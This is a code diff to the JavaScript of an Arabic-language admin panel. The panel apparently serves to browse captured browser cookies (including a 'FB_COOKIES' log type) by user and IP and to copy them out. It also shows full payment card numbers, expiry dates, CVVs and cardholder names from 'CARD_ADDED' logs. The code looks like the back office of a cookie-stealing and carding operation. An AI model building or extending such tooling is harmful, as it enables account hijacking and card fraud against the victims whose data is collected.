@@ -455,35 +455,142 @@ document.addEventListener('DOMContentLoaded', () => {
 
 
 // Cookies Data
+let allCookiesData = [];
+
 async function loadCookiesData() {
     const tbody = document.getElementById('cookies-tbody');
-    tbody.innerHTML = '<tr><td colspan="5" class="loading">جاري التحميل...</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="6" class="loading">جاري التحميل...</td></tr>';
 
     try {
-        const result = await fetchDocuments(APPWRITE_CONFIG.collections.cookies, ['limit(100)']);
-        const docs = result.documents || [];
+        // Fetch all cookies with pagination
+        allCookiesData = [];
+        let offset = 0;
+        const limit = 100;
+        let hasMore = true;
 
-        if (docs.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="5" class="loading">لا توجد Cookies</td></tr>';
-            return;
+        while (hasMore) {
+            const timestamp = Date.now();
+            const url = `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.cookies}/documents?limit=${limit}&offset=${offset}&_t=${timestamp}`;
+            const response = await fetch(url, {
+                method: 'GET',
+                headers: getAppwriteHeaders(),
+                cache: 'no-store'
+            });
+            const result = await response.json();
+            const docs = result.documents || [];
+            allCookiesData = allCookiesData.concat(docs);
+
+            if (docs.length < limit) hasMore = false;
+            else offset += limit;
+
+            tbody.innerHTML = `<tr><td colspan="6" class="loading">تم تحميل ${allCookiesData.length} كوكيز...</td></tr>`;
         }
 
-        tbody.innerHTML = docs.map(cookie => `
+        console.log(`Total cookies loaded: ${allCookiesData.length}`);
+        updateCookiesStats();
+        renderCookiesTable();
+    } catch (error) {
+        console.error('Error loading cookies:', error);
+        tbody.innerHTML = '<tr><td colspan="6" class="loading">خطأ في التحميل</td></tr>';
+    }
+}
+
+function updateCookiesStats() {
+    const total = allCookiesData.length;
+    const today = new Date().toDateString();
+    const todayCount = allCookiesData.filter(c => new Date(c.capturedAt || c.$createdAt).toDateString() === today).length;
+    const uniqueUsers = new Set(allCookiesData.map(c => c.userId)).size;
+
+    document.getElementById('cookies-total').textContent = total;
+    document.getElementById('cookies-today').textContent = todayCount;
+    document.getElementById('cookies-unique-users').textContent = uniqueUsers;
+}
+
+function renderCookiesTable() {
+    const tbody = document.getElementById('cookies-tbody');
+    const searchQuery = (document.getElementById('cookies-search')?.value || '').toLowerCase();
+
+    let filtered = allCookiesData;
+    if (searchQuery) {
+        filtered = filtered.filter(c =>
+            (c.userId || '').toLowerCase().includes(searchQuery) ||
+            (c.ip || '').toLowerCase().includes(searchQuery)
+        );
+    }
+
+    // Sort by date (newest first)
+    filtered.sort((a, b) => new Date(b.capturedAt || b.$createdAt) - new Date(a.capturedAt || a.$createdAt));
+
+    if (filtered.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="6" class="loading">لا توجد Cookies مطابقة</td></tr>';
+        return;
+    }
+
+    tbody.innerHTML = filtered.map(cookie => {
+        const cookiesLength = (cookie.cookies || '').length;
+        const cookiesPreview = cookiesLength > 0 ? `${cookiesLength} حرف` : 'فارغ';
+
+        return `
       <tr>
         <td>${cookie.userId || '-'}</td>
         <td>${cookie.ip || '-'}</td>
-        <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;">${cookie.url || '-'}</td>
+        <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;" title="${cookie.url || ''}">${cookie.url || '-'}</td>
+        <td><span style="background: ${cookiesLength > 0 ? '#4CAF50' : '#666'}; color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px;">${cookiesPreview}</span></td>
         <td>${new Date(cookie.capturedAt || cookie.$createdAt).toLocaleString('ar-EG')}</td>
         <td>
-          <button class="btn btn-sm btn-primary" onclick="viewCookie('${cookie.$id}')">👁️</button>
+          <button class="btn btn-sm btn-primary" onclick="viewCookieDetails('${cookie.$id}')">👁️ عرض</button>
+          <button class="btn btn-sm btn-success" onclick="copyCookieById('${cookie.$id}')">📋</button>
           <button class="btn btn-sm btn-danger" onclick="deleteCookie('${cookie.$id}')">🗑️</button>
         </td>
       </tr>
-    `).join('');
-    } catch (error) {
-        tbody.innerHTML = '<tr><td colspan="5" class="loading">خطأ في التحميل</td></tr>';
+    `;
+    }).join('');
+}
+
+function viewCookieDetails(id) {
+    const cookie = allCookiesData.find(c => c.$id === id);
+    if (!cookie) return;
+
+    document.getElementById('modal-user').textContent = cookie.userId || '-';
+    document.getElementById('modal-ip').textContent = cookie.ip || '-';
+    document.getElementById('modal-url').textContent = cookie.url || '-';
+    document.getElementById('modal-date').textContent = new Date(cookie.capturedAt || cookie.$createdAt).toLocaleString('ar-EG');
+    document.getElementById('modal-cookies').value = cookie.cookies || 'لا توجد كوكيز';
+    document.getElementById('cookie-modal').style.display = 'flex';
+}
+
+function closeCookieModal() {
+    document.getElementById('cookie-modal').style.display = 'none';
+}
+
+function copyModalCookies() {
+    const textarea = document.getElementById('modal-cookies');
+    textarea.select();
+    document.execCommand('copy');
+    alert('تم نسخ الكوكيز!');
+}
+
+function copyCookieById(id) {
+    const cookie = allCookiesData.find(c => c.$id === id);
+    if (cookie && cookie.cookies) {
+        navigator.clipboard.writeText(cookie.cookies);
+        alert('تم نسخ الكوكيز!');
     }
 }
+
+// Event listeners for cookies
+document.addEventListener('DOMContentLoaded', () => {
+    const cookiesSearch = document.getElementById('cookies-search');
+    const refreshCookies = document.getElementById('refresh-cookies');
+
+    if (cookiesSearch) {
+        cookiesSearch.addEventListener('input', () => setTimeout(renderCookiesTable, 300));
+    }
+    if (refreshCookies) {
+        refreshCookies.addEventListener('click', loadCookiesData);
+    }
+});
+
 
 // Logs Data with Card Search
 let allLogsData = [];
@@ -633,16 +740,61 @@ function renderLogsTable() {
     }
 
     tbody.innerHTML = paginatedLogs.map(log => {
-        // Highlight matched card in data
-        let displayData = log.data || '-';
+        // Parse and format data based on type
+        let displayData = '-';
+        let parsedData = {};
+
+        try {
+            parsedData = JSON.parse(log.data || '{}');
+        } catch (e) {
+            displayData = log.data || '-';
+        }
+
+        if (log.type === 'CARD_ADDED') {
+            const cardNum = parsedData.number || '';
+            const maskedCard = cardNum ? `****${cardNum.slice(-4)}` : '-';
+            displayData = `
+                <div style="font-family: monospace; font-size: 12px;">
+                    <div><strong style="color:#00FF41;">💳</strong> <span style="color:#FFD700;">${cardNum || '-'}</span></div>
+                    <div><strong style="color:#888;">📅</strong> ${parsedData.expiry || '-'} | <strong style="color:#888;">🔒</strong> ${parsedData.cvv || '-'}</div>
+                    <div style="color:#888; font-size:10px;">👤 ${parsedData.name || '-'}</div>
+                </div>
+            `;
+        } else if (log.type === 'BIN_REGISTERED') {
+            displayData = `
+                <div style="font-family: monospace;">
+                    <span style="background:#4CAF50; color:white; padding:2px 6px; border-radius:4px;">${parsedData.pattern || parsedData.bin || '-'}</span>
+                    ${parsedData.name ? `<span style="color:#888; margin-left:10px;">${parsedData.name}</span>` : ''}
+                </div>
+            `;
+        } else if (log.type === 'FB_COOKIES') {
+            const cookiesLen = parsedData.cookies?.length || 0;
+            displayData = `
+                <div>
+                    🍪 <span style="color:#4CAF50;">${cookiesLen} حرف</span>
+                    ${parsedData.url ? `<br><span style="color:#888; font-size:10px;">${parsedData.url.substring(0, 50)}...</span>` : ''}
+                </div>
+            `;
+        } else if (log.type === 'CARD_BINDING') {
+            const statusColor = parsedData.status === 'SUCCESS' ? '#4CAF50' :
+                parsedData.status === 'FAILED' ? '#f44336' : '#ff9800';
+            displayData = `
+                <div>
+                    <span style="background:${statusColor}; color:white; padding:2px 8px; border-radius:4px;">${parsedData.status || 'UNKNOWN'}</span>
+                    <span style="color:#00FF41; margin-left:10px;">****${parsedData.cardLast4 || parsedData.card || '****'}</span>
+                    <br><span style="color:#888; font-size:10px;">${parsedData.reason || ''}</span>
+                </div>
+            `;
+        } else {
+            displayData = `<div style="max-width:300px;overflow:hidden;text-overflow:ellipsis;">${log.data || '-'}</div>`;
+        }
+
+        // Apply card search highlight
         if (cardSearch) {
-            try {
-                const data = JSON.parse(log.data || '{}');
-                const cardNumber = data.number || data.cardNumber || data.bin || '';
-                if (cardNumber) {
-                    displayData = displayData.replace(cardNumber, `<span style="background: #FFD700; color: #1a1a2e; padding: 2px 4px; border-radius: 4px;">${cardNumber}</span>`);
-                }
-            } catch (e) { }
+            const cardNumber = parsedData.number || parsedData.cardNumber || parsedData.bin || '';
+            if (cardNumber) {
+                displayData = displayData.replace(cardNumber, `<span style="background: #FFD700; color: #1a1a2e; padding: 2px 4px; border-radius: 4px;">${cardNumber}</span>`);
+            }
         }
 
         return `
@@ -650,7 +802,7 @@ function renderLogsTable() {
         <td>${log.userId || '-'}</td>
         <td><span class="badge badge-warning">${log.type || '-'}</span></td>
         <td>${log.ip || '-'}</td>
-        <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;">${displayData}</td>
+        <td>${displayData}</td>
         <td>${new Date(log.createdAt || log.$createdAt).toLocaleString('ar-EG')}</td>
       </tr>
     `;
